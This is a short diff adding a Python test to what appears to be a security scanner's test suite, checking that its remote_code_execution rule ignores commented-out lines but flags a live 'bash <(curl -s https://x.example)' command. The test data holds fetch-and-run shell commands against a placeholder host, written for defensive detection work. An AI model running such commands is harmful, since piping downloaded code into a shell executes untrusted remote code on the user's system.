@@ -42,3 +42,11 @@ def test_findings_are_deduplicated() -> None:
 
 def test_all_rules_registered() -> None:
     assert len(rule_names()) >= 10
+
+
+def test_commented_out_download_execution_is_ignored() -> None:
+    assert (
+        "remote_code_execution" not in analyze("# bash <(curl -s https://x.example)\n", "/ws").rules
+    )
+    assert "remote_code_execution" not in analyze('echo hi  # sh -c "$(curl x)"\n', "/ws").rules
+    assert "remote_code_execution" in analyze("bash <(curl -s https://x.example)\n", "/ws").rules
